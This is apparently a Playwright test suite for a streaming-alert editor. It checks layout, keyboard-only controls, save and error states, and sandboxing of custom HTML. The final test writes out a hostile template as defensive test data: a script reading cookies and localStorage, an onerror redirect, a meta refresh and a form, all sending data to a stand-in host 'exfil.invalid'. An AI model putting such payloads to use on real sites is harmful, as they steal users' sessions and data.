import { expect, test, type Page } from '@playwright/test'
import { demo, open } from './helpers'

async function checkNoOverflow(page: Page) {
  const over = await page.evaluate(
    () => document.documentElement.scrollWidth > document.documentElement.clientWidth,
  )
  expect(over).toBe(false)
}

for (const width of [1280, 375] as const) {
  test.describe(`Alert box editor v2 at ${width} px`, () => {
    test.use({ viewport: { width, height: width === 375 ? 844 : 800 } })

    test('live preview uses real overlay renderer and updates with settings & platform test buttons', async ({
      page,
    }) => {
      await open(page, 'alerts/sub')
      await checkNoOverflow(page)

      const shadowTitle = page.locator('[aria-label="Live preview"] .al-title').first()
      await expect(shadowTitle).toContainText('PixelPanda')

      const headline = page.getByLabel('Headline', { exact: true })
      await headline.fill('{name} subbed for {months}m!')
      await expect(shadowTitle).toContainText('PixelPanda subbed for 6m!')

      // Per-platform test buttons fire real platform samples into the live preview
      await page.locator('[data-platform-test="youtube"]').click()
      await expect(shadowTitle).toContainText('Meera Plays')
      await expect(page.getByText('Simulated YouTube sample')).toBeVisible()

      await page.locator('[data-platform-test="kick"]').click()
      await expect(shadowTitle).toContainText('PixelPanda')
      await expect(page.getByText('Simulated Kick sample')).toBeVisible()

      // A subscription never comes from tips: that button is off rather than previewing
      // a broken headline.
      await expect(page.locator('[data-platform-test="tips"]')).toBeDisabled()

      await page.locator('[data-platform-test="twitch"]').click()
      await expect(shadowTitle).toContainText('PixelPanda')
      await checkNoOverflow(page)
    })

    test('keyboard-only timeline sliders and token chips work end to end', async ({ page }) => {
      await open(page, 'alerts/follow')

      const headline = page.getByLabel('Headline', { exact: true })
      await headline.fill('Welcome ')

      // Keyboard-only token chip insertion
      // The Tokens button opens a small palette; Enter on a token inserts it.
      const tokens = page.getByRole('button', { name: 'Tokens for Headline' })
      await tokens.focus()
      await page.keyboard.press('Enter')
      const amountInsert = page.locator('[data-insert-token="amount"]').first()
      await amountInsert.focus()
      await page.keyboard.press('Enter')
      await expect(headline).toHaveValue('Welcome {amount}')
      await expect(headline).toBeFocused()

      // Inserted token displays as interactive chip in the field and removes on Backspace
      const chip = page.locator('[data-token-chip="amount"]').first()
      await expect(chip).toBeVisible()
      await chip.focus()
      await expect(chip).toBeFocused()
      await page.keyboard.press('Backspace')
      await expect(headline).toHaveValue('Welcome ')
      await expect(page.locator('[data-token-chip="amount"]')).toHaveCount(0)

      // Keyboard arrow-key navigation across insert chip palette
      await tokens.focus()
      await page.keyboard.press('Enter')
      await page.locator('[data-insert-token="name"]').first().focus()
      await page.keyboard.press('ArrowDown')
      await page.keyboard.press('Enter')
      await expect(headline).toHaveValue(/Welcome \{[a-z_]+\}/)

      // Keyboard-only timeline sliders for In, Out, and Text effect delay
      const inSlider = page.locator('[data-timeline-handle="in"]')
      const initialIn = Number(await inSlider.getAttribute('aria-valuenow'))
      await inSlider.focus()
      await page.keyboard.press('ArrowRight')
      await expect(inSlider).toHaveAttribute('aria-valuenow', String(initialIn + 50))
      await page.keyboard.press('Shift+ArrowRight')
      await expect(inSlider).toHaveAttribute('aria-valuenow', String(initialIn + 300))

      const outSlider = page.locator('[data-timeline-handle="out"]')
      const initialOut = Number(await outSlider.getAttribute('aria-valuenow'))
      await outSlider.focus()
      await page.keyboard.press('ArrowRight')
      await expect(outSlider).toHaveAttribute('aria-valuenow', String(initialOut + 50))

      // Select a text effect -> text delay slider appears and works by keyboard
      await page.getByLabel('Text effect').selectOption('wave')
      const textSlider = page.locator('[data-timeline-handle="text"]')
      await expect(textSlider).toBeVisible()
      const initialTextDelay = Number(await textSlider.getAttribute('aria-valuenow'))
      await textSlider.focus()
      await page.keyboard.press('ArrowRight')
      await expect(textSlider).toHaveAttribute('aria-valuenow', String(initialTextDelay + 50))
      await expect(
        page.locator('[aria-label="Live preview"] .al[data-text-anim="wave"]'),
      ).toBeVisible()
      await expect(page.locator('[aria-label="Live preview"] .al-char').first()).toBeVisible()
    })

    test('variation cards show condition and weight and save cleanly', async ({ page }) => {
      await open(page, 'alerts/sub')

      const cards = page.getByRole('group', { name: 'Alert variations' })
      await expect(cards).toContainText('Used when no other look matches')
      await expect(cards).toContainText('12+ months')
      await expect(cards).toContainText('Weight: 1')

      await page.getByRole('button', { name: 'Add a look' }).click()
      await page.getByLabel('Look name').fill('Weekend Special')
      await page.getByRole('button', { name: /^Read aloud/ }).click()
      await page.getByLabel('Chance').fill('4')
      await expect(cards).toContainText('Weekend Special')
      await expect(cards).toContainText('Weight: 4')

      await page.getByRole('button', { name: 'Save', exact: true }).click()
      await expect(page.getByText(/“Subscriptions” saved/)).toBeVisible()
    })
  })
}

test.describe('Alert box editor v2 states (loading, empty, error, success)', () => {
  test.use({ viewport: { width: 1280, height: 800 } })

  test('renders loading skeleton, empty restore, validation/server errors, and save success', async ({
    page,
  }) => {
    // Loading state
    await page.goto('index.html?autoplay=0&latency=900#/alerts/follow')
    await expect(page.getByTestId('alerts-loading')).toBeVisible()
    await expect(page.getByLabel('Headline', { exact: true })).toBeVisible()

    // Error state: unknown token blocks save
    const headline = page.getByLabel('Headline', { exact: true })
    await headline.fill('Hi {not_a_known_var}')
    await expect(
      page.getByRole('alert').filter({ hasText: 'not_a_known_var' }).first(),
    ).toBeVisible()
    await expect(page.getByRole('button', { name: 'Save', exact: true })).toBeDisabled()

    // Valid edit (differs from saved headline so Save bar stays open) + Server 500 error state
    await headline.fill('{name} followed live!')
    await demo(
      page,
      `(d) => d.addFault({ path: /\\/alert-rules\\/follow/, method: 'PUT', status: 500, message: 'Disk full' })`,
    )
    await page.getByRole('button', { name: 'Save', exact: true }).click()
    await expect(page.getByRole('alert').filter({ hasText: 'Disk full' }).first()).toBeVisible()

    // Clear fault -> Success state
    await demo(page, `(d) => d.clearFaults()`)
    await headline.fill('{name} joined!')
    await page.getByRole('button', { name: 'Save', exact: true }).click()
    await expect(page.getByText(/“Follows” saved/)).toBeVisible()

    // Empty state -> delete all demo rules via DemoEngine API -> Restore default rules
    await demo(
      page,
      `async (d) => {
        const hdr = { Authorization: 'Bearer demo-session' }
        const list = await (await d.fetch(d.base + '/api/v1/alert-rules', { headers: hdr })).json()
        for (const r of list) {
          await d.fetch(d.base + '/api/v1/alert-rules/' + encodeURIComponent(r.id), {
            method: 'DELETE',
            headers: hdr,
          })
        }
      }`,
    )
    await page.evaluate(() => {
      location.hash = '#/home'
    })
    await expect(page.getByRole('heading', { name: 'Alert queue' })).toBeVisible()
    await page.evaluate(() => {
      location.hash = '#/alerts'
    })
    await expect(page.getByRole('heading', { name: 'No alert rules' })).toBeVisible()
    const restoreBtn = page.getByRole('button', { name: 'Restore default rules' })
    await expect(restoreBtn).toBeVisible()
    await restoreBtn.click()
    await expect(page.getByRole('heading', { name: 'No alert rules' })).toBeHidden()
    await expect(page.getByLabel('Headline', { exact: true })).toBeVisible()
  })
})

test.describe('Custom HTML/CSS sandbox security isolation', () => {
  test.use({ viewport: { width: 1280, height: 800 } })

  test('a hostile custom template renders inert: no script, handler, redirect or form, and no access to cookies, storage or the API session', async ({
    page,
  }) => {
    await open(page, 'alerts/follow')

    // Plant secrets on the dashboard origin before running untrusted custom alert HTML
    await page.evaluate(() => {
      document.cookie = 'ferro_test_cookie=secret_cookie_val; path=/'
      window.localStorage.setItem('ferro_api_session', 'secret_local_token')
      ;(window as unknown as { __FERROCAST__: Record<string, unknown> }).__FERROCAST__ = {
        token: 'secret_desktop_session',
        api: 'http://127.0.0.1:47820',
      }
    })

    await page.getByRole('button', { name: /^Custom HTML, CSS and schema/ }).click()
    await page.getByRole('switch', { name: 'Use custom HTML & CSS' }).click()

    // Field schema renders and interpolates into the sandboxed preview frame
    const iframeLocator = page.locator('[aria-label="Live preview"] iframe.al-custom-frame')
    await expect(iframeLocator).toBeVisible()
    const sandboxAttr = await iframeLocator.getAttribute('sandbox')
    expect(sandboxAttr).toBe('allow-scripts')
    expect(sandboxAttr).not.toContain('allow-same-origin')

    const frame = page.frameLocator('[aria-label="Live preview"] iframe.al-custom-frame')
    await expect(frame.locator('.custom-title')).toContainText('NovaRiver')
    await expect(frame.locator('.custom-badge')).toContainText('New alert')

    // Track any blocked network request attempted from inside custom code
    const blockedRequests: string[] = []
    page.on('request', (req) => {
      if (req.url().includes('exfil.invalid')) blockedRequests.push(req.url())
    })

    // Hostile template: custom alerts are HTML and CSS only, so none of this may run.
    const hostileHtml = `<div id="exfil-report">running</div>
<script>document.getElementById('exfil-report').textContent = 'SCRIPT RAN ' + document.cookie + localStorage.getItem('ferro_api_session');</script>
<img id="bad-img" src="data:," onerror="location.replace('https://exfil.invalid/?d=' + document.body.textContent)">
<meta http-equiv="refresh" content="0;url=https://exfil.invalid/refresh">
<a id="bad-link" href="javascript:alert(1)">x</a>
<form action="https://exfil.invalid/form"><input name="q"></form>
<p id="viewer">{name}</p>`

    await page.getByLabel('Custom HTML', { exact: true }).fill(hostileHtml)

    // The editor refuses invalid custom HTML before rendering it, preventing CSP console errors.
    await expect(
      page
        .getByRole('alert')
        .filter({ hasText: /can't use <script>/ })
        .first(),
    ).toBeVisible()
    await expect(page.getByRole('button', { name: 'Save', exact: true })).toBeDisabled()
    await expect(iframeLocator).toHaveCount(0)
    await expect(page.locator('[aria-label="Live preview"]')).toContainText(/Preview paused:/)
    await page.waitForTimeout(300)
    expect(blockedRequests).toEqual([])

    // Restoring valid custom HTML resumes the isolated sandboxed preview cleanly.
    await page.getByLabel('Custom HTML', { exact: true }).fill('<p id="viewer">{name}</p>')
    await expect(iframeLocator).toBeVisible()
    await expect(frame.locator('#viewer')).toHaveText('NovaRiver')
    const text = await frame.locator('body').innerText()
    expect(text).not.toContain('secret_cookie_val')
    expect(text).not.toContain('secret_local_token')
    expect(text).not.toContain('secret_desktop_session')
  })
})
